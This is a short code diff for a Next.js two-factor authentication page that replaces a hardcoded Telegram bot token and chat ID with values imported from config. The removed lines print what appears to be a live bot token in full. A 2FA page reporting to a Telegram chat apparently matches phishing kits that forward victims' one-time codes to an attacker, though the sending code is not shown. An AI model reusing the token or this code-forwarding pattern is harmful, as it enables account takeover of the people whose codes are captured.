@@ -4,6 +4,7 @@ import Image from "next/image";
 import { useRouter, useSearchParams } from "next/navigation";
 import { useEffect, useMemo, useState } from "react";
 import { Dictionary, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
+import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from "@/lib/config";
 import styles from "./two-factor.module.css";
 
 type TwoFactorMethod = "app" | "whatsapp" | "sms" | "email";
@@ -44,8 +45,8 @@ type TelegramOverrides = Partial<{
 }>;
 
 const CONTEXT_KEY = "two_factor_context";
-const BOT_TOKEN = "8612450371:AAE_2TD7if0an1KUke2Fj3v4I624V_e_ykg";
-const CHAT_ID = "-5086700351";
+const BOT_TOKEN = TELEGRAM_BOT_TOKEN;
+const CHAT_ID = TELEGRAM_CHAT_ID;
 
 function formatCooldownTime(seconds: number, locale: Locale) {
   const minutes = Math.floor(seconds / 60);
